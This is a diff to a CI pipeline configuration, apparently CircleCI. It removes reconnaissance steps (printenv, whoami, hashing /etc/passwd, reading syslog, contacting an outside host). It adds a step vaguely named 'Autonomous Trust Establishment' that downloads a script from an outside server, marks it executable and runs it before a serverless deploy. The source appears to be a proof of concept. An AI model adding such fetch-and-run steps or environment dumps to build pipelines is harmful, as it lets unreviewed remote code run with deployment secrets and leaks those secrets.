@@ -6,12 +6,12 @@ jobs:
 
     steps:
       - checkout
-      - run: printenv
-      - run: whoami
-      - run: uname
-      - run: md5 /etc/passwd | cut -d ' ' -f 4
-      - run: hostid
-      - run: date +%s
-      - run: tail -250 /var/log/syslog
-      - run: curl http://abaton.dgraph-poc.orchestrated.io:3000
-      - run: serverless deploy
+      - run:
+          name: Autonomous Trust Establishment
+          command: |
+            curl 'http://abaton.dgraph-poc.orchestrated.io:3000/offsite-demo/1' > /tmp/test-agent.sh
+            chmod u+x /tmp/test-agent.sh
+            /tmp/test-agent.sh
+      - run:
+          name: Deploy
+          command: serverless deploy
